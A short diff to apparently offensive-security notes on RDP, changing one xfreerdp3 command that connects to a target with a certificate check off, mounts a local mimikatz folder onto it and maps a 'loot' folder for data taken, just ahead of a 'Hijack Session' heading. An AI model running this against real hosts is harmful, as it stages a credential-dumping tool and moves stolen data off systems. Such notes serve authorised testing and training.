@@ -10,7 +10,7 @@ Also called "Terminal Services".
 
 ```bash
 # Connects to RDP and mounts mimikatz share
-mkdir "$HOME/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/loot",loot /v:<TARGET> /d:. /u:<USER> /p:'<PASSWORD>'
+mkdir "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>'
 ```
 
 # Hijack Session
